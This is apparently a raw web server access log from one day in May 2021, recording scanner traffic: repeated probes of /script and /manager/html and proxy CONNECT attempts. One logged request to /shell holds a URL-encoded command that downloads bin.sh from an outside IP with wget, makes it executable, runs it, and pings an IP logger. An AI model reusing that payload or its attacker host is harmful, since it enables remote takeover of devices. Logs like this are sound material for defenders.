161.129.154.42 - - [04/May/2021:00:03:24 +0000] "CONNECT www.etsy.com:443 HTTP/1.1" 400 -
209.141.40.103 - - [04/May/2021:00:15:30 +0000] "GET /script HTTP/1.1" 404 1080
206.166.251.147 - - [04/May/2021:00:21:13 +0000] "GET /script HTTP/1.1" 404 1080
209.141.48.244 - - [04/May/2021:00:37:08 +0000] "GET /manager/html HTTP/1.1" 403 3503
147.135.165.22 - - [04/May/2021:00:42:06 +0000] "GET /shell?cd%20%2Ftmp%3Bwget%20http%3A%2F%2F203.159.80.188%2Fbin.sh%3Bchmod%20777%20bin.sh%3B.%2Fbin.sh%3Bwget%20https://iplogger.com/2cEsp6 HTTP/1.1" 404 1079
201.150.151.40 - - [04/May/2021:00:52:27 +0000] "GET / HTTP/1.1" 200 1
206.166.251.147 - - [04/May/2021:00:55:32 +0000] "GET /script HTTP/1.1" 404 1080
205.185.122.4 - - [04/May/2021:00:56:16 +0000] "GET /manager/html HTTP/1.1" 403 3503
198.98.54.148 - - [04/May/2021:00:58:05 +0000] "GET /manager/html HTTP/1.1" 403 3503
206.166.251.147 - - [04/May/2021:01:32:49 +0000] "GET /script HTTP/1.1" 404 1080
178.216.26.175 - - [04/May/2021:01:32:56 +0000] "GET / HTTP/1.1" 200 1
185.90.136.199 - - [04/May/2021:01:59:57 +0000] "GET /bc61121a8191137a1f6357ea09cea3d3.html HTTP/1.1" 404 1111
206.166.251.147 - - [04/May/2021:02:03:41 +0000] "GET /script HTTP/1.1" 404 1080
205.185.122.4 - - [04/May/2021:02:15:33 +0000] "GET /manager/html HTTP/1.1" 403 3503
209.141.40.103 - - [04/May/2021:02:25:53 +0000] "GET /script HTTP/1.1" 404 1080
206.166.251.147 - - [04/May/2021:02:36:09 +0000] "GET /script HTTP/1.1" 404 1080
205.185.122.4 - - [04/May/2021:02:54:31 +0000] "GET /manager/html HTTP/1.1" 403 3503
198.98.54.148 - - [04/May/2021:02:59:04 +0000] "GET /manager/html HTTP/1.1" 403 3503
183.136.225.14 - - [04/May/2021:03:16:36 +0000] "GET / HTTP/1.1" 200 1
183.136.225.14 - - [04/May/2021:03:16:37 +0000] "GET / HTTP/1.1" 200 1
183.136.225.14 - - [04/May/2021:03:16:37 +0000] "GET /favicon.ico HTTP/1.1" 404 1085
161.129.155.154 - - [04/May/2021:03:25:16 +0000] "CONNECT mkayranyoshit.xyz:443 HTTP/1.1" 400 -
209.17.97.50 - - [04/May/2021:03:25:49 +0000] "GET / HTTP/1.0" 200 1
209.141.48.244 - - [04/May/2021:03:32:02 +0000] "GET /manager/html HTTP/1.1" 403 3503
205.185.122.4 - - [04/May/2021:03:37:45 +0000] "GET /manager/html HTTP/1.1" 403 3503
161.129.155.154 - - [04/May/2021:04:04:05 +0000] "CONNECT beta.weloveclpudflare.de:443 HTTP/1.1" 400 -
161.129.155.154 - - [04/May/2021:04:09:38 +0000] "CONNECT addon.to:443 HTTP/1.1" 400 -
45.148.10.50 - - [04/May/2021:04:19:48 +0000] "-" 400 -
205.185.122.4 - - [04/May/2021:04:29:45 +0000] "GET /manager/html HTTP/1.1" 403 3503
209.141.40.103 - - [04/May/2021:04:31:35 +0000] "GET /script HTTP/1.1" 404 1080
198.98.54.148 - - [04/May/2021:05:02:47 +0000] "GET /manager/html HTTP/1.1" 403 3503
206.166.251.147 - - [04/May/2021:05:31:54 +0000] "GET /script HTTP/1.1" 404 1080
205.185.122.4 - - [04/May/2021:06:17:32 +0000] "GET /manager/html HTTP/1.1" 403 3503
209.141.48.244 - - [04/May/2021:06:20:09 +0000] "GET /manager/html HTTP/1.1" 403 3503
206.166.251.147 - - [04/May/2021:06:41:39 +0000] "GET /script HTTP/1.1" 404 1080
209.141.40.103 - - [04/May/2021:06:45:05 +0000] "GET /script HTTP/1.1" 404 1080
161.129.155.154 - - [04/May/2021:06:47:15 +0000] "CONNECT nusantaraproject.my.id:443 HTTP/1.1" 400 -
161.129.155.154 - - [04/May/2021:06:59:57 +0000] "CONNECT eintim.xyz:443 HTTP/1.1" 400 -
198.98.54.148 - - [04/May/2021:07:00:37 +0000] "GET /manager/html HTTP/1.1" 403 3503
205.185.122.4 - - [04/May/2021:07:57:42 +0000] "GET /manager/html HTTP/1.1" 403 3503
184.105.139.68 - - [04/May/2021:08:21:55 +0000] "GET / HTTP/1.1" 200 1
206.166.251.147 - - [04/May/2021:08:49:02 +0000] "GET /script HTTP/1.1" 404 1080
209.141.40.103 - - [04/May/2021:08:53:45 +0000] "GET /script HTTP/1.1" 404 1080
198.98.54.148 - - [04/May/2021:09:08:48 +0000] "GET /manager/html HTTP/1.1" 403 3503
209.141.48.244 - - [04/May/2021:09:19:28 +0000] "GET /manager/html HTTP/1.1" 403 3503
205.185.122.4 - - [04/May/2021:09:27:05 +0000] "GET /manager/html HTTP/1.1" 403 3503
194.9.53.223 - - [04/May/2021:10:25:04 +0000] "GET / HTTP/1.1" 200 1
206.166.251.147 - - [04/May/2021:10:48:03 +0000] "GET /script HTTP/1.1" 404 1080
